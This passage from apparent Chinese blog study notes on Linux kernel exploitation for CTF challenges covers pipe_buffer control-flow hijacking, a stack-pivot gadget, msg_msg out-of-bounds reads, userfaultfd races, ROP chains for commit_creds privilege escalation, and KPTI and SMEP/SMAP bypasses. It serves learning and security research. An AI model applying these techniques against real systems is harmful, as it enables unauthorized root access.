id="劫持程序执行流"><a href="#劫持程序执行流" class="headerlink" title="劫持程序执行流"></a>劫持程序执行流</h5><p>当我们利用 <code>close(pipe_fd[1]);close(pipe_fd[0]);</code>关闭管道两端时，会触发 <code>pipe_buffer-&gt;pipe_bufer_operations-&gt;release</code> 指针，因此可以覆写pipe_buf_operations函数表中的release指针或劫持函数表到可控区域，便可劫持程序执行流。其 <code>rdi</code>和 <code>rsi</code>均可控，<code>rdi</code>为 <code>struct pipe_inode_info</code>，<code>rsi</code>为 <code>struct pipe_buffer</code>。</p><p>调试时在 <code>pipe_buf_release</code>处下断点。</p><p>一个栈迁移的JOP gadget（不知道怎么搜这种类型的gadget)，实现效果是</p><p>RDX！&#x3D;RCX时PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET可以用于此处栈迁移</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exploooosion @ Exploooosion in ~/mypwn/linux_kernel/Digging-into-Kernel-3/core workenv [15:24:16] </span></span><br><span class="line">$ objdump -D --start-address=0xffffffff81250c9d --stop-address=0xffffffff81250cbf ../vmlinux</span><br><span class="line"></span><br><span class="line">../vmlinux：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">ffffffff81250c9d &lt;simple_write_begin+0x12d&gt;:</span><br><span class="line">ffffffff81250c9d:56                   push   %rsi</span><br><span class="line">ffffffff81250c9e:5c                   pop    %rsp</span><br><span class="line">ffffffff81250c9f:48 39 d1             cmp    %rdx,%rcx</span><br><span class="line">ffffffff81250ca2:72 e1                jb     ffffffff81250c85 &lt;simple_write_begin+0x115&gt;</span><br><span class="line">ffffffff81250ca4:5b                   pop    %rbx</span><br><span class="line">ffffffff81250ca5:31 c0                xor    %eax,%eax</span><br><span class="line">ffffffff81250ca7:5d                   pop    %rbp</span><br><span class="line">ffffffff81250ca8:41 5c                pop    %r12</span><br><span class="line">ffffffff81250caa:e9 91 25 db 00       jmp    ffffffff82003240 &lt;__x86_return_thunk&gt;</span><br><span class="line">ffffffff81250caf:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)</span><br><span class="line">ffffffff81250cb4:0f b6 4e 51          movzbl 0x51(%rsi),%ecx</span><br><span class="line">ffffffff81250cb8:b8 00 10 00 00       mov    <span class="variable">$0x1000</span>,%eax</span><br><span class="line">ffffffff81250cbd:48 d3              shl    %cl,%rax</span><br><span class="line">(workenv) </span><br><span class="line"><span class="comment"># exploooosion @ Exploooosion in ~/mypwn/linux_kernel/Digging-into-Kernel-3/core workenv [15:27:03] </span></span><br><span class="line">$ objdump -D --start-address=0xffffffff82003240 --stop-address=0xffffffff82003250 ../vmlinux</span><br><span class="line"></span><br><span class="line">../vmlinux：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">ffffffff82003240 &lt;__x86_return_thunk&gt;:</span><br><span class="line">ffffffff82003240:c3                   ret</span><br><span class="line">ffffffff82003241:cc                   int3</span><br><span class="line">ffffffff82003242:0f ae e8             lfence</span><br><span class="line">ffffffff82003245:eb f9                jmp    ffffffff82003240 &lt;__x86_return_thunk&gt;</span><br><span class="line">ffffffff82003247:cc                   int3</span><br><span class="line">(workenv) </span><br></pre></td></tr></table></figure><p>ps：可以通过pwntools寻找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;vmlinux&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> elf.search(asm(<span class="string">&#x27;push rsi; pop rsp;&#x27;</span>), executable = <span class="literal">True</span>):</span><br><span class="line">    <span class="built_in">print</span> elf.disasm(address = x, n_bytes = <span class="number">0x40</span>)</span><br><span class="line">    <span class="built_in">print</span></span><br></pre></td></tr></table></figure><h3 id="System-V-消息队列"><a href="#System-V-消息队列" class="headerlink" title="System V 消息队列"></a>System V 消息队列</h3><p>在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p><ul><li>msgget：创建一个消息队列</li><li>msgsnd：向指定消息队列发送消息</li><li>msgrcv：从指定消息队列接接收消息</li></ul><p>当我们创建一个消息队列时，在内核空间中会创建一个 <code>msg_queue</code> 结构体，其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">    <span class="type">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line">    <span class="type">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line">    <span class="type">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h4 id="msg-msg-kmalloc-any-GFP-KERNEL-ACCOUNT"><a href="#msg-msg-kmalloc-any-GFP-KERNEL-ACCOUNT" class="headerlink" title="msg_msg (kmalloc-any | GFP_KERNEL_ACCOUNT)"></a>msg_msg (kmalloc-any | GFP_KERNEL_ACCOUNT)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>  <span class="title">m_list</span>;</span>   <span class="comment">// 只有一条消息时，指向msg_queue的q_messages            /*     0  0x10 */  </span></span><br><span class="line"><span class="type">long</span> <span class="type">int</span>      m_type;   <span class="comment">/* message text size */</span>         <span class="comment">/*  0x10   0x8 */</span></span><br><span class="line"><span class="type">size_t</span>         m_ts;                 <span class="comment">/*  0x18   0x8 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *        <span class="title">next</span>;</span>                 <span class="comment">/*  0x20   0x8 */</span></span><br><span class="line"><span class="type">void</span> *                     security;             <span class="comment">/*  0x28   0x8 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size: 48, cachelines: 1, members: 5 */</span></span><br><span class="line"><span class="comment">/* last cacheline: 48 bytes */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>* <span class="title">prev</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>msg_queue</code> 和 <code>msg_msg</code> 构成双向链表</p><p><img src="/image/learning_linux_kernel_2/1760710744145.png" alt="1760710744145"></p><p><code>msg_queue</code> 的大小基本上是固定的，但是 <code>msg_msg</code> 作为承载消息的本体<strong>其大小是可以随着消息大小的改变而进行变动的</strong></p><p>当我们单次发送 <strong>大于【一个页面大小 - header size】</strong> 大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与 <code>msg_msg</code> 之间形成如下单向链表结构：单个 <code>msg_msgseg</code> 的大小最大为一个页面大小</p><p><img src="/image/learning_linux_kernel_2/1760710836562.png" alt="1760710836562"></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h4 id="越界数据读取"><a href="#越界数据读取" class="headerlink" title="越界数据读取"></a>越界数据读取</h4><p>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，我们不难想到的是：若是我们能够控制一个 <code>msg_msg</code> 的 header，将其 <code>m_ts</code> 成员改为一个较大的数，我们就能够<strong>越界读取出最多将近一张内存页大小的数据</strong></p><h3 id="条件竞争（Race-condition）"><a href="#条件竞争（Race-condition）" class="headerlink" title="条件竞争（Race condition）"></a>条件竞争（Race condition）</h3><h4 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h4><p>满足以下可能情况：</p><ul><li>不直接将用户空间的数据传入内核空间，只传入指针</li><li>后续操作会不止一次使用到该指针</li></ul><p>比如第一次使用指针校验用户空间的数据信息。先开辟一个线程不断地改写指针指向的数据信息，当前线程不断将数据信息合法化，形成竞争，总会存在经校验后的信息在使用时总会不合法的情况。</p><h4 id="userfaultfd系统调用（linux-5-11及以后不能使用）"><a href="#userfaultfd系统调用（linux-5-11及以后不能使用）" class="headerlink" title="userfaultfd系统调用（linux-5.11及以后不能使用）"></a>userfaultfd系统调用（linux-5.11及以后不能使用）</h4><p>大致功能：</p><ul><li>利用 <code>mmap</code>函数分配一块匿名内存（没有实际物理内存页）并注册为 <code>userfaultfd</code>。</li><li>当某线程访问该内存（或进行数据交换）时会触发缺页异常，从而将控制权交给userfaultfd 的 uffd monitor 线程。</li><li>利用 <code>uffd monitor</code> 线程实现一些恶意操作，例如 <code>sleep</code>在那里造成UAF、<code>double fetch</code>将某线程的数据覆写、或对某线程读写的内核对象释放掉后再分配到我们想要的地方。</li></ul><p>在较新版本的内核中修改了变量 <code>sysctl_unprivileged_userfaultfd</code> 的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int sysctl_unprivileged_userfaultfd __read_mostly;</span><br><span class="line">//...</span><br><span class="line">SYSCALL_DEFINE1(userfaultfd, int, flags)</span><br><span class="line">&#123;</span><br><span class="line">    struct userfaultfd_ctx *ctx;</span><br><span class="line">    int fd;</span><br><span class="line"></span><br><span class="line">    if (!sysctl_unprivileged_userfaultfd &amp;&amp;</span><br><span class="line">        (flags &amp; UFFD_USER_MODE_ONLY) == 0 &amp;&amp;</span><br><span class="line">        !capable(CAP_SYS_PTRACE)) &#123;</span><br><span class="line">        printk_once(KERN_WARNING &quot;uffd: Set unprivileged_userfaultfd &quot;</span><br><span class="line">            &quot;sysctl knob to 1 if kernel faults must be handled &quot;</span><br><span class="line">            &quot;without obtaining CAP_SYS_PTRACE capability\n&quot;);</span><br><span class="line">        return -EPERM;</span><br><span class="line">    &#125;</span><br><span class="line">//...</span><br></pre></td></tr></table></figure><p>之前的版本当中 <code>sysctl_unprivileged_userfaultfd</code> 这一变量被初始化为 <code>1</code>，而在较新版本的内核当中这一变量并没有被赋予初始值，<strong>编译器会将其放在 bss 段，默认值为 0</strong>，意味着只 <code>root</code>用户才能使用 <code>userfaultfd</code></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux kernel学习（一）</title>
      <link href="/2025/10/02/2025-10-3-learning_linux_kernel_1/"/>
      <url>/2025/10/02/2025-10-3-learning_linux_kernel_1/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="linux-kernel"><a href="#linux-kernel" class="headerlink" title="linux kernel"></a>linux kernel</h1><h2 id="一、kernel-pwn学习（一）"><a href="#一、kernel-pwn学习（一）" class="headerlink" title="一、kernel pwn学习（一）"></a>一、kernel pwn学习（一）</h2><h3 id="1、常用指令和脚本"><a href="#1、常用指令和脚本" class="headerlink" title="1、常用指令和脚本"></a>1、常用指令和脚本</h3><h4 id="解压命令"><a href="#解压命令" class="headerlink" title="解压命令"></a>解压命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> core <span class="comment">#创建core文件夹，在其中解压缩和打包</span></span><br><span class="line">file core.cpio <span class="comment">#查看压缩方式</span></span><br><span class="line"><span class="built_in">mv</span> core.cpio ./core/core.cpio.gz <span class="comment"># gunzip只能解压gz后缀的文件</span></span><br><span class="line"><span class="built_in">cd</span> core</span><br><span class="line">gunzip core.cpio.gz <span class="comment"># gzip解压</span></span><br><span class="line">cpio -idmv &lt; core.cpio <span class="comment"># cpio命令从命令行接收core.cpio作为参数来解压</span></span><br><span class="line"><span class="built_in">cp</span> core.ko ../core.ko</span><br><span class="line">trash-put core.cpio <span class="comment"># 不再需要</span></span><br><span class="line">vim init <span class="comment"># 修改init启动脚本，注释掉定时关机命令</span></span><br></pre></td></tr></table></figure><h4 id="打包命令"><a href="#打包命令" class="headerlink" title="打包命令"></a>打包命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o -H newc &gt; ../core.cpio</span><br><span class="line"><span class="comment"># 或者：</span></span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line"><span class="comment">#还原</span></span><br><span class="line"><span class="built_in">mv</span> core.cpio ../core.cpio</span><br><span class="line"><span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure><h4 id="gadget-地址查找"><a href="#gadget-地址查找" class="headerlink" title="gadget&#x2F;地址查找"></a>gadget&#x2F;地址查找</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nm ../vmlinux | grep -i <span class="string">&#x27;user_free_payload_rcu&#x27;</span>  <span class="comment">#查找user_free_payload_rcu的地址</span></span><br><span class="line">nm ../vmlinux | grep <span class="string">&#x27; T _stext&#x27;</span> <span class="comment">#查找kernel_base的地址</span></span><br><span class="line"></span><br><span class="line">ropper -f ../vmlinux --search <span class="string">&quot;push rsi;&quot;</span> <span class="comment">#查找gadget</span></span><br></pre></td></tr></table></figure><h4 id="编译命令"><a href="#编译命令" class="headerlink" title="编译命令"></a>编译命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp -masm=intel -static</span><br></pre></td></tr></table></figure><h4 id="gdb调试命令"><a href="#gdb调试命令" class="headerlink" title="gdb调试命令"></a>gdb调试命令</h4><p>查看保护信息：</p><ul><li><code>cat /proc/cpuinfo</code></li></ul><p>查找基地址：</p><ul><li><code>cat /proc/modules | grep [驱动名]</code></li><li><code>lsmod</code></li><li><code>cat /sys/module/[驱动名]/sections/.text</code></li></ul><p><code>add-symbol-file [驱动名] [基地址]</code> 加载符号表</p><p>查找函数地址：</p><ul><li><code>cat /proc/kallsyms | grep [函数名]</code></li></ul><p><code>b [function_name] / b entry_SYSCALL_64 if $[寄存器]==[变量]</code> 下断点</p><p>调试脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb -q \</span><br><span class="line">       -ex <span class="string">&quot;target remote:1234&quot;</span> \</span><br><span class="line">       -ex <span class="string">&quot;add-symbol-file ./kgadget.ko 0xffffffffc0002000&quot;</span> \</span><br><span class="line">       -ex <span class="string">&quot;b *0xffffffff81c00010 if \$r15==0xbeefdead&quot;</span></span><br></pre></td></tr></table></figure><h4 id="extract-vmlinux"><a href="#extract-vmlinux" class="headerlink" title="extract-vmlinux"></a>extract-vmlinux</h4><p><code>vmlinux</code> 是静态编译，未经过压缩的 kernel 文件，从中找到一些 gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_vmlinux</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># Use readelf to check if it&#x27;s a valid ELF</span></span><br><span class="line"><span class="comment"># TODO: find a better to way to check that it&#x27;s really vmlinux</span></span><br><span class="line"><span class="comment">#       and not just an elf</span></span><br><span class="line">readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$1</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">try_decompress</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span></span><br><span class="line"><span class="comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line"><span class="keyword">for</span>pos <span class="keyword">in</span> `<span class="built_in">tr</span> <span class="string">&quot;<span class="variable">$1</span>\n<span class="variable">$2</span>&quot;</span> <span class="string">&quot;\n<span class="variable">$2</span>=&quot;</span> &lt; <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | grep -abo <span class="string">&quot;^<span class="variable">$2</span>&quot;</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line"><span class="built_in">tail</span> -c+<span class="variable">$pos</span> <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">check_vmlinux <span class="variable">$tmp</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">&quot;<span class="variable">$img</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2</span><br><span class="line"><span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(<span class="built_in">mktemp</span> /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f <span class="variable">$tmp</span>&quot;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn&#x27;t work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">&#x27;\037\213\010&#x27;</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">&#x27;BZh&#x27;</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">&#x27;\211\114\132&#x27;</span> xy    <span class="string">&#x27;lzop -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="string">&#x27;lz4 -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure><h3 id="2、kernel-rop"><a href="#2、kernel-rop" class="headerlink" title="2、kernel rop"></a>2、kernel rop</h3><p>通常情况下kernel pwn一类题需要将可执行文件 <code>exp</code> 上传到远程服务器上并执行，该可执行文件 <code>exp</code> 需要具有提权+get shell两个功能，因为启动内核后的 <code>shell</code> 不具备 <code>root</code> 权限，无法查看非 <code>root</code> 用户才能打开的 <code>flag</code> 文件。因此需要在内核态执行 <code>commit_creds(prepare_kernel_cred(NULL))</code>（高版本为 <code>commit_creds(prepare_kernel_cred(&amp;init_task))</code> 或 <code>commit_creds(&amp;init_cred)</code> ）当前线程的 <code>cred</code> 结构体便变为 init 进程的 <code>cred</code> 的拷贝，也就获得了 <code>root</code> 权限。</p><h4 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h4><ul><li><code>swapgs</code>指令恢复用户态GS寄存器</li><li><code>sysretq</code>或者 <code>iretq</code>恢复到用户空间</li></ul><p><code>iretq</code> 会依次从栈中弹出 <code>RIP</code>、<code>CS</code>、<code>RFLAGS</code> 等信息，从而实现从内核态返回到用户态的跳转。</p><p>ROP链构造：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><h4 id="KPTI-bypass（内核页表隔离）"><a href="#KPTI-bypass（内核页表隔离）" class="headerlink" title="KPTI bypass（内核页表隔离）"></a>KPTI bypass（内核页表隔离）</h4><p>KPTI中每个进程有两套页表——内核态页表与用户态页表(两个地址空间)。内核态页表只能在内核态下访问，可以创建到内核和用户的映射（用户空间受SMAP和SMEP保护）。用户态页表只包含用户空间和部分内核地址。KPTI 同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（NX）。</p><p>每个进程都有一套指向进程自身的页表，由CR3寄存器指向。因为内核空间的PGD与用户空间的PGD 两张页全局目录表放在一段连续的内存中，只需将CR3 的第 13 位取反便能完成页表切换的操作。</p><p><img src="/image/learning_linux_kernel_1/1740298529614.png" alt="1740298529614"></p><p>用于完成内核态页表切换回到用户态页表的函数 <code>swapgs_restore_regs_and_return_to_usermode</code>，栈空间布局如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cat /proc/kallsyms| grep swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">↓   swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">    0 // padding</span><br><span class="line">    0 // padding</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><p>或者找到类似如下 <code>gadget</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov  rdi, cr3</span><br><span class="line">or rdi, 0x1000</span><br><span class="line">mov  cr3, rdi</span><br></pre></td></tr></table></figure><h4 id="smep-smap-bypass"><a href="#smep-smap-bypass" class="headerlink" title="smep &amp;&amp; smap bypass"></a>smep &amp;&amp; smap bypass</h4><p><strong>SMEP</strong> ：位于Cr4的第20位，作用是让处于内核权限的CPU无法执行用户代码。<br><strong>SMAP</strong> ：位于Cr4的第21位，作用是让处于内核权限的CPU无法读写用户代码。</p><p><img src="/image/learning_linux_kernel_1/1740466406857.png" alt="1740466406857"></p><p>在未开启 <code>smep/smap</code>机制时，<code>cr4</code>的值一般为 <code>0x6f0</code> ，利用 <code>gadget</code>将其修改为此值即可绕过保护</p><h4 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h4><p>在内核中存在一块 <code>direct mapping 